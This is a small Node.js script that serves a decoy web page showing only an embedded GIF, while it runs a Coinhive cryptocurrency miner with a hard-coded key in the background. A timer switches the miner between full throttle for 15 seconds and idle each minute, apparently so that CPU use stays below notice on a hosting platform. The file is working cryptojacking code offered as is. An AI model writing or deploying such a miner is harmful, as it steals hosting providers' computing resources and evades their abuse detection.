const ch = require('coin-hive');
const http = require('http');

const requestHandler = (request, response) => {
  response.end('<iframe src="https://giphy.com/embed/z48aJruaX0Jsk" width="480" height="358" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>')
}

const server = http.createServer(requestHandler)

server.listen(process.env.PORT, (err) => {
  if (err) {
    return console.log('Error: ', err)
  }

  (async () => {
    global.miner = await ch('3HxgYhsNTsbLJSSTfUIMVRVvVdf3AJVt', {
      throttle: 1.0 //Start with no full prevention, idle 100%
    });

    await global.miner.start();
    console.log('Miner is Running.')
  })();

  console.log('Server is Up!')
});

setInterval(function() {
  global.miner.rpc('setThrottle', [0]);
  console.log("Miner: setThrottle 0 / FULL POWER")

  setTimeout(async () => {
    global.miner.rpc('setThrottle', [1.0]);
    console.log("Miner: setThrottle 1.0 / IDLE 100%")
  }, 15000);
}, 60000);
